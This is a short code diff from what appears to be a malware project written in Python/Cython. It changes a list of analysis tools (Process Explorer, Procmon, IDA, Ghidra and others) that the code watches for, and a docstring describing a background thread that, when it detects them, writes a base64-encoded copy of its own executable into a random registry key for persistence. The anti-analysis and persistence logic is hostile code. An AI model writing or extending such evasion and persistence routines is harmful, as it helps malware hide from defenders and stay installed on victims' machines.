@@ -6,7 +6,7 @@ from random import choice
 import signal,atexit
 from Utils.helpers import get_current_file_path,run_detached_process,\
     find_python_path,random_string,base64_encode_file,setRegistryKey,TypicalRegistryKey
-debug_process = ['procexp', 'procmon' 'autoruns', 'processhacker', 'ida', 'ghidra']
+cdef list debug_process = ['procexp', 'procmon' 'autoruns', 'processhacker', 'ida', 'ghidra']
 
 cpdef bint find_debug_process():
     """we return true if we found any debug process exists, else false"""
@@ -24,6 +24,7 @@ def remove_on_exit():
 
 def process_monitor():
     """
+    we didn't cpde'ed this because closures aren't supported in cython
     really simple, this function run as thread in the background.
     if we find any debug process, we are doing the next steps:
     1. we create random key in the registry with value being our base64 code of the current exe(persistence)
